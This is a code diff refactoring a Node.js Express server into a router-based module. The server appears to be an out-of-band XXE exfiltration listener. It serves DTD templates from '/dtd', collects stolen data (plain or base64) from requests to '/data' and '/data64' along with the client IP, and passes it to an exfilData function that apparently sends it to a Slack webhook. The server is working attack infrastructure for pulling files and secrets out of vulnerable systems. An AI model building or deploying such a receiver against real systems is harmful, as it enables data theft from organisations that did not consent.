@@ -6,6 +6,7 @@ const slackWebhook = require('slack-webhook');
 const WEBHOOK_URL = process.env.SLACK_WEBHOOK;
 const slack = new slackWebhook(WEBHOOK_URL);
 
+const router = express.Router();
 const app = express()
 
 
@@ -25,10 +26,10 @@ const ipMiddleware = (req, res, next) => {
   next();
 };
 
-app.use(ipMiddleware);
+router.use(ipMiddleware);
 
 
-app.get('/dtd', (req, res) => {
+router.get('/dtd', (req, res) => {
   console.log('dtd requested');
   let template = '';
   if (req.query.filename) { 
@@ -50,14 +51,14 @@ app.get('/dtd', (req, res) => {
 });
 
 
-app.get('/data', (req, res) => {
+router.get('/data', (req, res) => {
   let data = decodeURIComponent(req.originalUrl.substring(6));
   console.log('data received');
   exfilData({'data': data, 'clientIp': req.clientIp});
   res.send('');
 });
 
-app.get('/data64', (req, res) => {
+router.get('/data64', (req, res) => {
   let data64 = decodeURIComponent(req.originalUrl.substring(8));
   var buf = Buffer.from(data64,'base64');
   console.log('data received');
@@ -65,8 +66,6 @@ app.get('/data64', (req, res) => {
   res.send('');
 });
   
-
-app.listen(3000, () => console.log("Listening on 3000"));
 
 // Modify this function to log the data wherever you'd prefer
 
@@ -78,3 +77,5 @@ async function exfilData(exfil) {
   }
 
 }
+app.use(router);
+module.exports = app;
